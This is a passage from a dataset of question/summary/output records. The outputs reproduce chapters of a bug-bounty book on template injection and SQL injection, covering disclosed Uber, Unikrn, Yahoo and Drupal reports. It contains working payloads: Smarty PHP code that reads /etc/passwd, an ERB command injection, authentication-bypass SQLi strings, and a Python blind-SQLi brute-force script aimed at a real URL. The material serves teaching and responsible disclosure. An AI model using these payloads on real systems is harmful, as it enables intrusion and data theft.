alert(1) is a JavaScript popup. This proof of concept\ndemonstrated to Uber that attackers could exploit this CSTI to achieve\nXSS, resulting in potentially compromised developer accounts and\nassociated apps.\nTakeaways\nAfter you confirm whether a site is using a client-side template\nengine, begin testing the site by submitting simple payloads using the\nsame syntax as the engine, such as {{7*7}} for AngularJS, and\nwatching for the rendered result. If the payload is executed, check\nwhich version of AngularJS the site is using by typing\nAngular.version in the browser console. If the version is greater than\n1.6, you can submit a payload from the aforementioned resources\nwithout a Sandbox bypass. If it’s less than 1.6, you’ll need to submit a\nSandbox bypass like Kettle’s, specific to the AngularJS version the\napplication is using.\nUBER FLASK JINJA2 TEMPLATE\nINJECTION\n151\nDownload from www.finelybook.com 7450911@qq.com\nDifficulty: Medium\nURL: https://riders.uber.com/\nSource: https://hackerone.com/reports/125980/\nDate reported: March 25, 2016\nBounty paid: $10,000\nWhen you’re hacking, it’s important to identify the technologies a\ncompany uses. When Uber launched its public bug bounty program on\nHackerOne, it also included a “treasure map” on its site at\nhttps://eng.uber.com/bug-bounty/ (a revised map was published in\nAugust 2017 at https://medium.com/uber-security-privacy/uber-bug-\nbounty-treasure-map-17192af85c1a/). The map identified a number of\nsensitive properties Uber operated, including the software each one\nused.\nIn its map, Uber disclosed that riders.uber.com was built with\nNode.js, Express, and Backbone.js, none of which immediately jumps\nout as a potential SSTI attack vector. But the sites vault.uber.com and\npartners.uber.com were developed using Flask and Jinja2. Jinja2 is a\nserver-side template engine that can allow remote code execution if\nimplemented incorrectly. Although riders.uber.com didn’t use Jinja2,\nif the site supplied input to either the vault or partners subdomains\nand those sites trusted the input without sanitizing it, an attacker might\nbe able to exploit an SSTI vulnerability.\nOrange Tsai, the hacker who found this vulnerability, entered\n{{1+1}} as his name to begin testing for SSTI vulnerabilities. He\nsearched for whether any interaction took place between the\nsubdomains.\nIn his write-up, Orange explained that any change to a profile on\nriders.uber.com would result in an email to the account owner\n152\nDownload from www.finelybook.com 7450911@qq.com\nnotifying them of the change—a common security approach. By\nchanging his name on the site to include {{1+1}}, he received an email\nwith a 2 in his name, as shown in Figure 8-1.\nFigure 8-1: The email Orange received executing the code he had injected into his\nname\nThis behavior immediately raised a red flag because Uber\nevaluated his expression and replaced it with the result of the\nequation. Orange then tried to submit the Python code {% for c in\n[1,2,3]%} {{c,c,c}} {% endfor %} to confirm that a more complex\noperation could be evaluated. This code iterates over the array [1,2,3]\nand prints each number three times. The email in Figure 8-2 shows\nOrange’s name displayed as nine numbers that resulted from the for\nloop executing, which confirmed his finding.\nJinja2 also implements a Sandbox, which limits the ability to\nexecute arbitrary code but can occasionally be bypassed. In this case,\nOrange would have been able to do just that.\n153\nDownload from www.finelybook.com 7450911@qq.com\nFigure 8-2: The email that resulted from Orange’s injection of more complex code\nOrange only reported the ability to execute code in his write-up,\nbut he could have taken the vulnerability even further. In his write-up,\nhe credited nVisium’s blog posts with providing the information\nnecessary to find the bug. But these posts also contain additional\ninformation about the scope of Jinja2 vulnerabilities when combined\nwith other concepts. Let’s take a slight detour to see how this added\ninformation applies to Orange’s vulnerability by looking at nVisium’s\n154\nDownload from www.finelybook.com 7450911@qq.com\nblog post at https://nvisium.com/blog/2016/03/09/exploring-ssti-in-\nflask-jinja2.html.\nIn the blog post, nVisium walks through exploiting Jinja2 by using\nintrospection, an object-oriented programming concept. Introspection\ninvolves inspecting the properties of an object at runtime to see what\ndata is available to it. The details of how object-oriented introspection\nworks are beyond the scope of this book. In the context of this bug,\nintrospection allowed Orange to execute code and identify what\nproperties were available to the template object when the injection\noccurred. Once an attacker knows that information, they could find\npotentially exploitable properties they could use to achieve remote\ncode execution; I’ll cover this vulnerability type in Chapter 12.\nWhen Orange found this vulnerability, he simply reported the\nability to execute the code necessary to perform the introspection\nrather than attempting to take the vulnerability further. It’s best to take\nOrange’s approach because it ensures you don’t perform any\nunintended actions; also, companies can assess the potential impact of\nthe vulnerability. If you’re interested in exploring the full severity of\nan issue, ask the company in your report whether you can continue\ntesting.\nTakeaways\nNote the technologies a site uses; often, these lead to insights into how\nyou can exploit the site. Be sure to also consider how the technologies\ninteract with each other. In this case, Flask and Jinja2 were great\nattack vectors, although they weren’t directly used on the vulnerable\nsite. As with XSS vulnerabilities, check all possible places your input\nmight be used, because a vulnerability might not be immediately\napparent. In this case, the malicious payload was rendered as plaintext\n155\nDownload from www.finelybook.com 7450911@qq.com\non the user’s profile page, and the code was executed when emails\nwere sent.\nRAILS DYNAMIC RENDER\nDifficulty: Medium\nURL: N/A\nSource: https://nvisium.com/blog/2016/01/26/rails-dynamic-\nrender-to-rce-cve-2016-0752/\nDate reported: February 1, 2015\nBounty paid: N/A\nIn early 2016, the Ruby on Rails team disclosed a potential remote\ncode execution vulnerability in the way they handled rendering\ntemplates. A member of the nVisium team identified the vulnerability\nand provided a valuable write-up of the issue, assigned CVE-2016-\n0752. Ruby on Rails uses a model, view, controller architecture\n(MVC) design. In this design, the database logic (the model) is\nseparated from the presentation logic (the view) and the application\nlogic (the controller). MVC is a common design pattern in\nprogramming that improves code maintainability.\nIn its write-up, the nVisium team explains how Rails controllers,\nwhich are responsible for the application logic, can infer what\ntemplate file to render based on user-controlled parameters.\nDepending on how the site was developed, these user-controlled\nparameters might be passed directly to the render method responsible\nfor passing data to the presentation logic. The vulnerability could\noccur from a developer passing the input to the render function, such as\nby calling the render method and params[:template] where the\n156\nDownload from www.finelybook.com 7450911@qq.com\nparams[:template] value is the dashboard. In Rails, all parameters from\nan HTTP request are available to the application controller logic via\nthe params array. In this case, a parameter template is submitted in the\nHTTP request and passed to the render function.\nThis behavior is noteworthy because the render method provides no\nspecific context to Rails; in other words, it doesn’t provide a path or\nlink to a specific file and just automagically determines which file\nshould return content to the user. It’s able to do this because Rails\nstrongly implements convention over configuration: whatever\ntemplate parameter value is passed to the render function is used to\nscan for filenames to render content with. According to the discovery,\nRails would first recursively search the application root directory\n/app/views. This is the common default folder for all files used to\nrender content for users. If Rails couldn’t find a file using its given\nname, it scanned the application root directory. If it still couldn’t find\nthe file, Rails scanned the server root directory.\nBefore CVE-2016-0752, a malicious user could pass\ntemplate=%2fetc%2fpasswd and Rails would look for the file /etc/passwd\nin the views directory, then the application directory, and finally the\nserver root directory. Assuming you were using a Linux machine and\nthe file was readable, Rails would print your /etc/passwd file.\nAccording to nVisium’s article, the search sequence Rails uses can\nalso be used for arbitrary code execution when a user submits a\ntemplate injection, such as <%25%3d`ls`%25>. If the site uses the\ndefault Rails template language ERB, this encoded input is interpreted\nas <%= `ls` %>, or the Linux command to list all files in the current\ndirectory. While the Rails team has fixed this vulnerability, you can\nstill test for SSTI in case a developer passes user-controlled input to\nrender inline: because inline: is used to supply ERB directly to the render\n157\nDownload from www.finelybook.com 7450911@qq.com\nfunction.\nTakeaways\nUnderstanding how the software you’re testing works will help you\nuncover vulnerabilities. In this case, any Rails site was vulnerable if it\nwas passing user-controlled input to the render function. Understanding\nthe design patterns Rails uses undoubtedly helped to uncover this\nvulnerability. As with the template parameter in this example, be on\nthe lookout for opportunities that arise when you control input that\nmight be directly related to how content is being rendered.\nUNIKRN SMARTY TEMPLATE INJECTION\nDifficulty: Medium\nURL: N/A\nSource: https://hackerone.com/reports/164224/\nDate reported: August 29, 2016\nBounty paid: $400\nOn August 29, 2016, I was invited to the then-private bug bounty\nprogram for Unikrn, an eSports betting site. During my initial site\nreconnaissance, the Wappalyzer tool I was using confirmed that the\nsite was using AngularJS. This discovery raised a red flag for me\nbecause I’d been successful at finding AngularJS injection\nvulnerabilities. I began looking for CSTI vulnerabilities by submitting\n{{7*7}} and looking for the number 49 rendered, beginning with my\nprofile. Although I wasn’t successful on the profile page, I noticed\nyou could invite friends to the site, so I also tested that functionality.\nAfter submitting an invitation to myself, I received the odd email\n158\nDownload from www.finelybook.com 7450911@qq.com\nshown in Figure 8-3.\nFigure 8-3: The email I received from Unikrn with a Smarty error\nThe beginning of the email included a stack trace with a Smarty\nerror that showed 7*7 was not recognized. It looked as though {{7*7}}\nwas being injected into the template, and Smarty was trying to\nevaluate the code but didn’t recognize 7*7.\nI immediately consulted James Kettle’s indispensable article on\ntemplate injection (http://blog.portswigger.net/2015/08/server-side-\ntemplate-injection.html) to test the Smarty payload he referenced (he\n159\nDownload from www.finelybook.com 7450911@qq.com\nalso provides a great Black Hat presentation available on YouTube).\nKettle specifically referenced the payload\n{self::getStreamVariable(\"file:///proc/self/loginuuid\")}, which calls the\nmethod getStreamVariable to read the file /proc/self/loginuuid. I tried the\npayload he shared but received no output.\nNow I was skeptical of my finding. But then I searched the Smarty\ndocumentation for its reserved variables, which included the\n{$smarty.version} variable that returns the version of Smarty being used.\nI changed my profile name to {$smarty.version} and reinvited myself to\nthe site. The result was an invitation email that used 2.6.18 as my\nname, which was the Smarty version installed on the site. My\ninjection was being executed, and my confidence was restored.\nWhen I continued to read the documentation, I learned that you can\nuse the tags {php} {/php} to execute arbitrary PHP code (Kettle\nspecifically mentions these tags in his article, but I had completely\nmissed them). So, I tried the payload {php}print \"Hello\"{/php} as my\nname and submitted the invite again. The resulting email stated that\nHello had invited me to the site, confirming that I had executed PHP’s\nprint function.\nAs a final test, I wanted to extract the /etc/passwd file to\ndemonstrate the potential of this vulnerability to the bounty program.\nAlthough the /etc/passwd file isn’t critical, accessing it is commonly\nused as a flag to demonstrate remote code execution. So I used the\nfollowing payload:\n{php}$s=file_get_contents('/etc/passwd');var_dump($s);{/php}\nThis PHP code opens the /etc/passwd file, reads its contents using\nfile_get_contents, and assigns the contents to the $s variable. Once $s is\n160\nDownload from www.finelybook.com 7450911@qq.com\nset, I dump the contents of that variable using var_dump, expecting the\nemail I receive will include the contents of /etc/passwd as the name of\nthe person who invited me to the Unikrn site. But strangely enough,\nthe email I received had a blank name.\nI wondered whether Unikrn was limiting the length of names. This\ntime I searched the PHP documentation for file_get_contents, which\ndetailed how to limit the amount of data read at a time. I changed my\npayload to the following:\n{php}$s=file_get_contents('/etc/passwd',NULL,NULL,0,100);var_dump($s);{/php}\nThe key parameters in this payload are '/etc/passwd', 0, and 100. The\npath refers to the file to read, 0 instructs PHP where to start in the file\n(in this case at the beginning of the file), and 100 denotes the length of\ndata to read. I reinvited myself to Unikrn using this payload, which\nproduced the email shown in Figure 8-4.\n161\nDownload from www.finelybook.com 7450911@qq.com\nFigure 8-4: The Unikrn invitation email showing contents of the /etc/passwd file\nI successfully executed arbitrary code and, as proof of concept,\nextracted the /etc/passwd file 100 characters at a time. After I\nsubmitted my report, the vulnerability was fixed within the hour.\nTakeaways\nWorking on this vulnerability was great fun. The initial stack trace\nwas a red flag that something was wrong, and as the saying goes,\n“Where there’s smoke, there’s fire.” If you find a potential SSTI,\nalways read the documentation to determine how best to proceed—\n162\nDownload from www.finelybook.com 7450911@qq.com\nand be persistent.\nSUMMARY\nWhen you’re searching for vulnerabilities, it’s best to try to confirm\nthe underlying technology (be it a web framework, frontend rendering\nengine, or something else) to identify possible attack vectors and ideas\nto test. The variety of template engines makes it difficult to determine\nwhat will and won’t work in all situations, but knowing which\ntechnology is being used will help you overcome that challenge. Be on\nthe lookout for opportunities that arise when text you control is being\nrendered. Also, keep in mind that vulnerabilities might not be\nimmediately apparent but could still exist in other functionality, such\nas in emails.\n163"
  },
  {
    "input": "What is a SQL injection vulnerability and how can it be exploited to gain unauthorized access to a database?",
    "summary": "SQL injection is a security vulnerability that allows attackers to manipulate database queries, potentially extracting sensitive information or creating unauthorized access. Databases store data in tables, and SQL is used to interact with this data. Blind SQL injection occurs when an attacker can't see the direct output of their query but can infer information by comparing results. The Yahoo! Sports example demonstrates a blind SQL injection where an attacker modified a URL parameter to extract database information without directly seeing the query's output.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n9\nSQL INJECTION\nWhen a vulnerability on a database-backed site allows an attacker to\nquery or attack the site’s database using SQL (Structured Query\nLanguage), it is known as a SQL injection (SQLi). Often, SQLi attacks\nare highly rewarded because they can be devastating: attackers can\nmanipulate or extract information or even create an administrator\nlogin for themselves in the database.\nSQL DATABASES\nDatabases store information in records and fields contained in a\ncollection of tables. Tables contain one or more columns, and a row in\na table represents a record in the database.\nUsers rely on SQL to create, read, update, and delete records in a\ndatabase. The user sends SQL commands (statements or queries) to\nthe database, and—assuming the commands are accepted—the\ndatabase interprets the statements and performs some action. Popular\nSQL databases include MySQL, PostgreSQL, MSSQL, and so on. In\nthis chapter, we’ll use MySQL, but the general concepts apply to all\n164\nDownload from www.finelybook.com 7450911@qq.com\nSQL databases.\nSQL statements are made up of keywords and functions. For\nexample, the following statement tells the database to select\ninformation from the name column in the users table for records where\nthe ID column is equal to 1.\nSELECT name FROM users WHERE id = 1;\nMany websites rely on databases to store information and use that\ninformation to dynamically generate content. For example, if the site\nhttps://www.<example>.com/ stored your previous orders in a\ndatabase that you accessed when you logged in with your account,\nyour web browser would query the site’s database and generate\nHTML based on the information returned.\nThe following is a theoretical example of a server’s PHP code to\ngenerate a MySQL command after a user visits https://www.\n<example>.com?name=peter:\n$name = ➊$_GET['name'];\n$query = \"SELECT * FROM users WHERE name = ➋'$name' \";\n➌ mysql_query($query);\nThe code uses $_GET[] ➊ to access the name value from the URL\nparameters specified between its brackets and stores the value in the\n$name variable. Then the parameter is passed to the $query variable ➋\nwithout any sanitization. The $query variable represents the query to\nexecute and fetches all data from the users table where the name\ncolumn matches the value in the name URL parameter. The query\nexecutes by passing the $query variable to the PHP function\nmysql_query ➌.\nThe site expects name to contain regular text. But if a user enters\n165\nDownload from www.finelybook.com 7450911@qq.com\nthe malicious input test' OR 1='1 into the URL parameter, such as\nhttps://www.example.com?name=test' OR 1='1, the executed query is this:\n$query = \"SELECT * FROM users WHERE name = 'test➊' OR 1='1➋' \";\nThe malicious input closes the opening single quote (') after the\nvalue test ➊ and adds the SQL code OR 1='1 to the end of the query.\nThe hanging single quote in OR 1='1 opens the closing single quote\nthat is hardcoded after ➋. If the injected query didn’t include an\nopening single quote, the hanging quote would cause SQL syntax\nerrors, which would prevent the query from executing.\nSQL uses the conditional operators AND and OR. In this case, the\nSQLi modifies the WHERE clause to search for records where the name\ncolumn matches test or the equation 1='1' returns true. MySQL helpfully\ntreats '1' as an integer, and because 1 always equals 1, the condition is\ntrue and the query returns all records in the users table. But injecting\ntest' OR 1='1 won’t work when other parts of the query are sanitized.\nFor example, you might use a query like this:\n$name = $_GET['name'];\n$password = ➊mysql_real_escape_string($_GET['password']);\n$query = \"SELECT * FROM users WHERE name = '$name' AND password = '$password' \";\nIn this case, the password parameter is also user controlled but\nproperly sanitized ➊. If you used the same payload, test' OR 1='1, as\nthe name and if your password was 12345, your statement would look\nlike this:\n$query = \"SELECT * FROM users WHERE name = 'test' OR 1='1' AND password = '12345'\n\";\nThe query looks for all records where the name is test or 1='1' and\n166\nDownload from www.finelybook.com 7450911@qq.com\nthe password is 12345 (we’ll ignore the fact that this database stores\nplaintext passwords, which is another vulnerability). Because the\npassword check uses an AND operator, this query won’t return data\nunless a record’s password is 12345. Although this breaks our\nattempted SQLi, it doesn’t stop us from trying another attack method.\nWe need to eliminate the password parameter, which we can do by\nadding ;--, test' OR 1='1;--. This injection accomplishes two tasks: the\nsemicolon (;) ends the SQL statement, and the two dashes (--) tell the\ndatabase that the remainder of the text is a comment. This injected\nparameter changes the query to SELECT * FROM users WHERE name =\n'test' OR 1='1';. The AND password = '12345' code in the statement becomes\na comment, so the command returns all records from the table. When\nyou’re using -- as a comment, keep in mind that MySQL requires a\nspace after the dashes and the remaining query. Otherwise, MySQL\nwill return errors without executing the command.\nCOUNTERMEASURES AGAINST SQLI\nOne protection available to prevent SQLi is the use of prepared\nstatements, which are a database feature that executes repeated\nqueries. The specific details of prepared statements are beyond the\nscope of this book, but they protect against SQLi because queries are\nno longer executed dynamically. The database uses the queries like\ntemplates by having placeholders for variables. As a result, even when\nusers pass unsanitized data to a query, the injection can’t modify the\ndatabase’s query template, thus preventing SQLi.\nWeb frameworks, such as Ruby on Rails, Django, Symphony, and\nso on, also offer built-in protections to help prevent SQLi. But they\naren’t perfect and can’t prevent the vulnerability everywhere. The two\n167\nDownload from www.finelybook.com 7450911@qq.com\nsimple examples of SQLi you’ve just seen usually won’t work on sites\nbuilt with frameworks unless the site developers didn’t follow best\npractices or didn’t recognize that protections weren’t automatically\nprovided. For example, the site https://rails-sqli.org/ maintains a list\nof common SQLi patterns in Rails that result from developer\nmistakes. When testing for SQLi vulnerabilities, your best bet is to\nlook for older websites that look custom built or use web frameworks\nand content management systems that don’t have all the built-in\nprotections of current systems.\nYAHOO! SPORTS BLIND SQLI\nDifficulty: Medium\nURL: https://sports.yahoo.com\nSource: N/A\nDate reported: February 16, 2014\nBounty paid: $3,705\nA blind SQLi vulnerability occurs when you can inject SQL\nstatements into a query but can’t get a query’s direct output. The key\nto exploiting blind injections is to infer information by comparing the\nresults of unmodified and modified queries. For example, in February\n2014, Stefano Vettorazzi found a blind SQLi when testing the Yahoo!\nsports subdomain. The page took parameters through its URL, queried\na database for information, and returned a list of NFL players based\non the parameters.\nVettorazzi changed the following URL, which returned the NFL\nplayers in 2010, from this:\nsports.yahoo.com/nfl/draft?year=2010&type=20&round=2\n168\nDownload from www.finelybook.com 7450911@qq.com\nto this:\nsports.yahoo.com/nfl/draft?year=2010--&type=20&round=2\nVettorazzi added two dashes (--) to the year parameter in the second\nURL. Figure 9-1 shows what the page looked like in Yahoo! before\nVettorazzi added the two dashes. Figure 9-2 shows the result after\nVettorazzi added the dashes.\nThe players returned in Figure 9-1 are different from those\nreturned in Figure 9-2. We can’t see the actual query because the code\nis on the backend of the website. But the original query likely passed\neach URL parameter to a SQL query that looked something like this:\nSELECT * FROM players WHERE year = 2010 AND type = 20 AND round = 2;\nBy adding two dashes to the year parameter, Vettorazzi would have\naltered the query to this:\nSELECT * FROM PLAYERS WHERE year = 2010-- AND type = 20 AND round = 2;\n169\nDownload from www.finelybook.com 7450911@qq.com\nFigure 9-1: Yahoo! player search results with an unmodified year parameter\n170\nDownload from www.finelybook.com 7450911@qq.com\nFigure 9-2: Yahoo! player search results with a modified year parameter including -\n-\nThis Yahoo! bug is slightly unusual because queries must end with\na semicolon in most, if not all, databases. Because Vettorazzi only\ninjected two dashes and commented out the query’s semicolon, this\n171\nDownload from www.finelybook.com 7450911@qq.com\nquery should fail and either return an error or no records. Some\ndatabases can accommodate queries without semicolons, so Yahoo!\nwas either using this functionality or its code accommodated the error\nin some other way. Regardless, after Vettorazzi recognized the\ndifferent results the queries returned, he tried to infer the database\nversion the site was using by submitting the following code as the year\nparameter:\n(2010)and(if(mid(version(),1,1))='5',true,false))--\nThe MySQL database version() function returns the current version\nof the MySQL database in use. The mid function returns part of the\nstring passed to its first parameter according to its second and third\nparameters. The second argument specifies the starting position of the\nsubstring that the function will return, and the third argument specifies\nthe length of the substring. Vettorazzi checked whether the site used\nMySQL by calling version(). Then he tried to get the first digit in the\nversion number by passing the mid function 1 as its first argument for\nthe starting position and 1 as its second argument for the substring\nlength. The code checks the first digit of the MySQL version using an\nif statement.\nThe if statement takes three arguments: a logical check, the action\nto perform if the check is true, and the action to perform if the check is\nfalse. In this case, the code checks whether the first digit from version\nis 5; if so, the query returns true. If not, the query returns false.\nThen Vettorazzi connected the true/false output with the year\nparameter using the and operator, so if the major version of the\nMySQL database was 5, players in the year 2010 would be returned\non the Yahoo! web page. The query works this way because the\n172\nDownload from www.finelybook.com 7450911@qq.com\ncondition 2010 and true would be true, whereas 2010 and false would be\nfalse and return no records. Vettorazzi executed the query and received\nno records, as shown in Figure 9-3, meaning the first digit of the value\nreturned from version wasn’t 5.\nFigure 9-3: Yahoo! player search results were empty when the code checked\nwhether the database version started with the number 5.\nThis bug is a blind SQLi because Vettorazzi couldn’t inject his\nquery and see the output directly on the page. But Vettorazzi could\nstill find information about the site. By inserting Boolean checks, such\nas the version-checking if statement, Vettorazzi could infer the\ninformation he needed. He could have continued to extract\ninformation from the Yahoo! database. But finding information about\nthe MySQL version through his test query was enough to confirm to\nYahoo! that the vulnerability existed.\n173"
  },
  {
    "input": "How can an attacker exploit a blind SQLi vulnerability to extract database information without accessing confidential data?",
    "summary": "SQLi vulnerabilities can be exploited even without direct access to the database, often through URL parameters or encoded links. Orange Tsai discovered a blind SQLi in Uber's system by modifying a base64-encoded unsubscribe link and using a Python script to brute-force database information. Another SQLi vulnerability in Drupal allowed attackers to inject malicious SQL commands into login queries, enabling them to gain administrative access. Both examples highlight the importance of checking for encoded parameters and understanding how input is processed by a site's database API.",
    "output": "Download from www.finelybook.com 7450911@qq.com\nTakeaways\nSQLi vulnerabilities, like other injection vulnerabilities, aren’t always\ndifficult to exploit. One way to find a SQLi vulnerability is to test\nURL parameters and look for subtle changes to query results. In this\ncase, adding the double dash changed the results of Vettorazzi’s\nbaseline query, revealing the SQLi.\nUBER BLIND SQLI\nDifficulty: Medium\nURL: http://sctrack.email.uber.com.cn/track/unsubscribe.do/\nSource: https://hackerone.com/reports/150156/\nDate reported: July 8, 2016\nBounty paid: $4,000\nIn addition to web pages, you can find blind SQLi vulnerabilities in\nother places, such as email links. In July 2016, Orange Tsai received\nan email advertisement from Uber. He noticed that the unsubscribe\nlink included a base64-encoded string as a URL parameter. The link\nlooked like this:\nhttp://sctrack.email.uber.com.cn/track/unsubscribe.do?\np=eyJ1c2VyX2lkIjogIjU3NTUiLCAicmVjZWl2ZXIiOiAib3Jhbmdl\nQG15bWFpbCJ9\nDecoding the p parameter value\neyJ1c2VyX2lkIjogIjU3NTUiLCAicmVjZWl2ZXIiOiAib3JhbmdlQG15bWFpbCJ\n9 using base64 returns the JSON string {\"user_id\": \"5755\", \"receiver\":\n\"orange@mymail\"}. To the decoded string, Orange added the code and\nsleep(12) = 1 to the encoded p URL parameter. This harmless addition\n174\nDownload from www.finelybook.com 7450911@qq.com\nmakes the database take longer to respond to the unsubscribe action\n{\"user_id\": \"5755 and sleep(12)=1\", \"receiver\": \"orange@mymail\"}. If a site is\nvulnerable, the query execution evaluates sleep(12) and performs no\naction for 12 seconds before comparing the output of the sleep\ncommand to 1. In MySQL, the sleep command normally returns 0, so\nthis comparison will fail. But it doesn’t matter because the execution\nwill take at least 12 seconds.\nAfter Orange reencoded the modified payload and passed the\npayload to the URL parameter, he visited the unsubscribe link to\nconfirm that the HTTP response took at least 12 seconds. Realizing he\nneeded more concrete proof of the SQLi to send to Uber, he dumped\nthe user name, host name, and database name using brute force. By\ndoing so, he demonstrated that he could extract information from the\nSQLi vulnerability without accessing confidential data.\nA SQL function called user returns the user name and host name of\na database in the form <user>@<host>. Because Orange couldn’t\naccess output from his injected queries, he couldn’t call user. Instead,\nOrange modified his query to add a conditional check when the query\nlooked up his user ID, comparing one character of the database’s user\nname and host name string at a time using the mid function. Similar to\nthe Yahoo! Sports blind SQLi vulnerability in the previous bug report,\nOrange used a comparison statement and brute force to derive each\ncharacter of the user name and host name string.\nFor example, Orange took the first character of the value returned\nfrom the user function using the mid function. Then he compared\nwhether the character was equal to 'a', then 'b', then 'c', and so on. If the\ncomparison statement was true, the server would execute the\nunsubscribe command. This result indicated that the first character of\nthe user function’s return value was equal to the character it was being\n175\nDownload from www.finelybook.com 7450911@qq.com\ncompared to. If the statement was false, the server would not try to\nunsubscribe Orange. By checking each character of the user function’s\nreturn value using this method, Orange could eventually derive the\nentire user name and host name.\nManually brute-forcing a string takes time, so Orange created a\nPython script that generated and submitted payloads to Uber on his\nbehalf, as follows:\n➊ import json\nimport string\nimport requests\nfrom urllib import quote\nfrom base64 import b64encode\n➋ base = string.digits + string.letters + '_-@.'\n➌ payload = {\"user_id\": 5755, \"receiver\": \"blog.orange.tw\"}\n➍ for l in range(0, 30):\n➎ for i in base:\n➏ payload['user_id'] = \"5755 and mid(user(),%d,1)='%c'#\"%(l+1, i)\n➐ new_payload = json.dumps(payload)\nnew_payload = b64encode(new_payload)\nr = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.\ndo?p='+quote(new_payload))\n➑ if len(r.content)>0:\nprint i,\nbreak\nThe Python script begins with five lines of import statements ➊ that\nretrieve the libraries Orange needed to process HTTP requests, JSON,\nand string encodings.\nA database user name and host name can be made up of any\ncombination of uppercase letters, lowercase letters, numbers, hyphens\n(-), underscores (_), at symbols (@), or periods (.). At ➋, Orange\ncreates the base variable to hold these characters. The code at ➌\ncreates a variable to hold the payload that the script sends to the\n176\nDownload from www.finelybook.com 7450911@qq.com\nserver. The line of code at ➏ is the injection, which uses the for loops\nat ➍ and ➎.\nLet’s look at the code at ➏ in detail. Orange references his user\nID, 5755, with the string user_id as defined at ➌ to create his payloads.\nHe uses the mid function and string processing to construct a payload\nsimilar to the Yahoo! bug earlier in this chapter. The %d and %c in the\npayload are string replacement placeholders. The %d is data that\nrepresents a digit, and the %c is character data.\nThe payload string starts at the first pair of double quotes (\") and\nends at the second pair of double quotes before the third percent\nsymbol at ➏. The third percent symbol tells Python to replace the %d\nand %c placeholders with the values following the percent symbol in\nthe parentheses. So the code replaces %d with l+1 (the variable l plus\nthe number 1) and %c with the variable i. The hash mark (#) is another\nway of commenting in MySQL and renders any part of the query\nfollowing Orange’s injection into a comment.\nThe l and i variables are the loop iterators at ➍ and ➎. The first\ntime the code enters l in range (0,30) at ➍, l will be 0. The value of l is\nthe position in the user name and host name string returned by the user\nfunction that the script is trying to brute-force. Once the script has a\nposition in the user name and host name string it’s testing, the code\nenters a nested loop at ➎ that iterates over each character in the base\nstring. The first time the script iterates through both loops, l will be 0\nand i will be a. These values are passed to the mid function at ➏ to\ncreate the payload \"5755 and mid(user(),0,1)='a'#\".\nIn the next iteration of the nested for loop, the value of l will still be\n0 and i will be b to create the payload \"5755 and mid(user(),0,1)='b'#\". The\nposition l will remain constant as the loop iterates though each\n177\nDownload from www.finelybook.com 7450911@qq.com\ncharacter in base to create the payload at ➏.\nEach time a new payload is created, the code following ➐ converts\nthe payload to JSON, reencodes the string using the base64encode\nfunction, and sends the HTTP request to the server. The code at ➑\nchecks whether the server responds with a message. If the character in\ni matches the user name substring at the position being tested, the\nscript stops testing characters at that position and moves to the next\nposition in the user string. The nested loop breaks and returns to the\nloop at ➍, which increments l by 1 to test the next position of the user\nname string.\nThis proof of concept allowed Orange to confirm that the database\nuser name and host name were sendcloud_w@10.9.79.210 and the\ndatabase name was sendcloud (to obtain the database name, replace user\nwith database at ➏). In response to the report, Uber confirmed that the\nSQLi hadn’t occurred on its server. The injection occurred on a third-\nparty server that Uber was using, but Uber still paid a reward. Not all\nbounty programs will do the same. Uber likely paid a bounty because\nthe exploit would allow an attacker to dump all of Uber’s customer\nemail addresses from the sendcloud database.\nAlthough you can write your own scripts as Orange did to dump\ndatabase information from a vulnerable website, you can also use\nautomated tools. Appendix A includes information about one such\ntool called sqlmap.\nTakeaways\nKeep an eye out for HTTP requests that accept encoded parameters.\nAfter you decode and inject your query into a request, be sure to\nreencode your payload so everything still matches the encoding the\n178\nDownload from www.finelybook.com 7450911@qq.com\nserver expects.\nExtracting a database name, user name, and host name is generally\nharmless, but be sure it’s within the permitted actions of the bounty\nprogram you’re working in. In some cases, the sleep command is\nenough for a proof of concept.\nDRUPAL SQLI\nDifficulty: Hard\nURL: Any Drupal site using version 7.32 or earlier\nSource: https://hackerone.com/reports/31756/\nDate reported: October 17, 2014\nBounty paid: $3,000\nDrupal is a popular open source content management system for\nbuilding websites, similar to Joomla! and WordPress. It’s written in\nPHP and is modular, meaning you can install new functionality in\nunits to a Drupal site. Every Drupal install contains Drupal core,\nwhich is a set of modules that runs the platform. These core modules\nrequire a connection to a database, such as MySQL.\nIn 2014, Drupal released an urgent security update to Drupal core\nbecause all Drupal sites were vulnerable to a SQLi vulnerability that\ncould easily be abused by anonymous users. The impact of the\nvulnerability would allow an attacker to take over any unpatched\nDrupal site. Stefan Horst discovered the vulnerability when he noticed\na bug in Drupal core’s prepared statement functionality.\nThe Drupal vulnerability occurred in Drupal’s database application\nprogramming interface (API). The Drupal API uses the PHP Data\nObjects (PDO) extension, which is an interface for accessing\n179\nDownload from www.finelybook.com 7450911@qq.com\ndatabases in PHP. An interface is a programming concept that\nguarantees inputs and outputs of a function without defining how the\nfunction is implemented. In other words, PDO hides the differences\nbetween databases so programmers can use the same functions to\nquery and fetch data regardless of the database type. PDO includes\nsupport for prepared statements.\nDrupal created a database API to use the PDO functionality. The\nAPI creates a Drupal database abstraction layer so developers never\nhave to query the database directly with their own code. But they can\nstill use prepared statements and use their code with any database\ntype. The specifics of the API are beyond the scope of this book. But\nyou need to know that the API will generate the SQL statements to\nquery the database and has built-in security checks to prevent SQLi\nvulnerabilities.\nRecall that prepared statements prevent SQLi vulnerabilities\nbecause an attacker can’t modify the query structure with malicious\ninput, even if the input is unsanitized. But prepared statements can’t\nprotect against SQLi vulnerabilities if the injection occurs when the\ntemplate is being created. If an attacker can inject malicious input\nduring the template creation process, they can create their own\nmalicious prepared statement. The vulnerability Horst discovered\noccurred because of SQL’s IN clause, which looks for values that exist\nin a list of values. For example, the code SELECT * FROM users WHERE\nname IN ('peter', 'paul', 'ringo'); selects the data from the users table where\nthe value in the name column is peter, paul, or ringo.\nTo understand why the IN clause is vulnerable, let’s look at the\ncode behind Drupal’s API:\n$this->expandArguments($query, $args);\n180\nDownload from www.finelybook.com 7450911@qq.com\n$stmt = $this->prepareQuery($query);\n$stmt->execute($args, $options);\nThe expandArguments function is responsible for building queries\nthat use the IN clause. After expandArguments builds queries, it passes\nthem to prepareQuery, which builds the prepared statements that the\nexecute function executes. To understand the significance of this\nprocess, let’s look at the relevant code for expandArguments as well:\n--snip--\n➊ foreach(array_filter($args, `is_array`) as $key => $data) {\n➋ $new_keys = array();\n➌ foreach ($data as $i => $value) {\n--snip--\n➍ $new_keys[$key . '_' . $i] = $value;\n}\n--snip--\n}\nThis 